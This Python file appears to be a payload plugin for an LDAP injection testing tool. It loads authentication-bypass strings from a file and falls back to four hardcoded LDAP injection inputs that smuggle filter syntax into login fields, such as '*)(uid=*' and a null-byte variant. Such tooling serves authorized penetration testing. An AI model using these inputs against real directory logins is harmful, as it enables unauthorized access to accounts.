
import os
from ldapmap_attacker.plugins.base import BasePayload


class AuthenticationBypassPayload(BasePayload):
    def generate(self):
        payloads = []
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
        file_path = os.path.join(base_dir, "payloads", "auth_bypass.txt")

        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append((line, "bypass", "auth bypass"))
        except FileNotFoundError:
            payloads = [
                ("*", "wildcard", "match all"),
                ("admin*", "wildcard", "admin prefix"),
                ("*)(uid=*", "comment", "comment inj"),
                ("*)%00", "null", "null byte"),
            ]

        return payloads
